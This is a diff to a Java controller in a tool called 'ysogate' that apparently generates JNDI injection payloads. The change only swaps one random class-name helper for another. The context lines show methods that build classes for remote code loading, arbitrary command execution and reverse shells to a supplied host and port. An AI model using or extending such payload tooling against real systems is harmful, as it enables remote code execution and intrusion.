@@ -1,6 +1,7 @@
 package com.h2tg.ysogate.controller;
 
 import com.h2tg.ysogate.config.JndiConfig;
+import com.h2tg.ysogate.utils.RandomUtils;
 import javassist.*;
 import javassist.bytecode.AccessFlag;
 import javassist.bytecode.ClassFile;
@@ -13,7 +14,6 @@ import com.h2tg.ysogate.utils.CtClassUtils;
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 import java.io.IOException;
-
 import static com.h2tg.ysogate.utils.MiscUtils.parseCustomData;
 
 @JNDIController
@@ -45,7 +45,7 @@ public class BasicController implements Controller {
             url = "http://" + url;
         }
 
-        String className = MiscUtils.getRandStr(12);
+        String className = RandomUtils.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -64,7 +64,7 @@ public class BasicController implements Controller {
     public byte[] command(String cmd) throws Exception {
         System.out.println("[Command] Cmd: " + cmd);
 
-        String className = MiscUtils.getRandStr(12);
+        String className = RandomUtils.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -100,7 +100,7 @@ public class BasicController implements Controller {
     public byte[] reverseShell(String host, String port) throws Exception {
         System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);
 
-        String className = MiscUtils.getRandStr(12);
+        String className = RandomUtils.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
